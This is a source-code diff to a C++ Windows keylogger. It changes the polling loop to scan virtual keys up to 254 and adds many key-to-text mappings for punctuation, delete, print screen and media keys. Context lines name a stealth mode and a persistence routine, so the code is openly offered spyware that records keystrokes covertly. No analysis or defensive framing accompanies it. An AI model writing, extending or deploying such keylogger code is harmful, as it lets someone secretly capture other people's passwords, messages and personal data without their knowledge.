@@ -1,4 +1,4 @@
-//   Author(s) : Narcis GRECU(narcisgrecu07@gmail.com
+//   Author(s) : Narcis GRECU (narcisgrecu07@gmail.com)
 
 #include "KeyLogger.h"
 
@@ -33,13 +33,13 @@ bool KeyLogger::StartStealthMode()
 
 void KeyLogger::StartLogging()
 {
-	unsigned char Key;
+	int Key;
 	std::string Character;
 	bool CapsIsPressed = GetKeyState(VK_CAPITAL) & 0x0001;
 
 	while (true)
 	{
-		for (Key = 8; Key <= 127; Key++)
+		for (Key = 8; Key <= 254; Key++)
 		{
 			if (GetAsyncKeyState(Key) == MSB)
 			{
@@ -54,10 +54,9 @@ void KeyLogger::StartLogging()
 	}
 }
 
-std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
+std::string KeyLogger::GetChar(int Key, bool CapsIsPressed)
 {
 	std::string StringKey = "";
-	std::string SpecialChars = "1234567890";
 
 	if (Key >= 0x60 && Key <= 0x69) // it's a numpad key
 	{
@@ -77,6 +76,18 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		StringKey = " ";
 		return StringKey;
 
+	case VK_SNAPSHOT:
+		StringKey = "[PRINT SCREEN]";
+		return StringKey;
+
+	case VK_DELETE:
+		StringKey = "[DELETE]";
+		return StringKey;
+
+	case VK_NUMLOCK:
+		StringKey = "[NUM LOCK]";
+		return StringKey;
+
 	case VK_ESCAPE:
 		StringKey = "[ESC]";
 		return StringKey;
@@ -90,7 +101,7 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		return StringKey;
 
 	case VK_BACK:
-		StringKey = "\b";
+		StringKey = "[BACKSPACE]";
 		return StringKey;
 
 	case VK_CAPITAL:
@@ -125,14 +136,6 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		StringKey = "[ALT]";
 		return StringKey;
 
-	case VK_OEM_1:
-		StringKey = ";";
-
-		if (IsPressed(VK_SHIFT))
-			StringKey = ":";
-
-		return StringKey;
-
 	case VK_OEM_PLUS:
 		StringKey = "=";
 
@@ -163,6 +166,78 @@ std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
 		if (IsPressed(VK_SHIFT))
 			StringKey = ">";
 
+		return StringKey;
+
+	case VK_OEM_1:
+		StringKey = ";";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = ":";
+
+		return StringKey;
+
+	case VK_OEM_2:
+		StringKey = "/";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "?";
+
+		return StringKey;
+
+	case VK_OEM_3:
+		StringKey = "`";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "~";
+
+		return StringKey;
+
+	case VK_OEM_4:
+		StringKey = "[";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "{";
+
+		return StringKey;
+
+	case VK_OEM_5:
+		StringKey = "\\";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "|";
+
+		return StringKey;
+
+	case VK_OEM_6:
+		StringKey = "]";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "}";
+
+		return StringKey;
+
+	case VK_OEM_7:
+		StringKey = "'";
+
+		if (IsPressed(VK_SHIFT))
+			StringKey = "\"";
+
+		return StringKey;
+
+	case VK_MEDIA_NEXT_TRACK:
+		StringKey = "[NEXT TRACK]";
+		return StringKey;
+
+	case VK_MEDIA_PREV_TRACK:
+		StringKey = "[PREV TRACK]";
+		return StringKey;
+
+	case VK_MEDIA_STOP:
+		StringKey = "[STOP TRACK]";
+		return StringKey;
+
+	case VK_MEDIA_PLAY_PAUSE:
+		StringKey = "[PLAY/PAUSE TRACK]";
 		return StringKey;
 
 	default:
@@ -291,7 +366,7 @@ bool KeyLogger::RegisterPersistence()
 	return true;
 }
 
-bool KeyLogger::IsPressed(char Key)
+bool KeyLogger::IsPressed(int Key)
 {
 	return (GetAsyncKeyState(Key) & MSB);
 }
